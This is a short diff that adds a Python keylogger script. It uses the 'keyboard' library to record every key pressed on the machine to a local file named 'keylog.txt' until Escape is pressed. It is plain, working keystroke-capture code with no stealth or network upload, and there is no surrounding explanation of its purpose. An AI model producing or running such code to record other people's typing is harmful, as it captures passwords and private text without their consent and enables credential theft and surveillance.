@@ -1,0 +1,14 @@
+import keyboard
+import time
+
+# Function to save keys pressed to a file
+def log_keys():
+    with open("keylog.txt", "w") as f:
+        while True:
+            key_pressed = keyboard.read_key()
+            f.write(key_pressed)
+            f.write("\n")
+            f.flush()
+
+            if key_pressed == "esc":
+                break
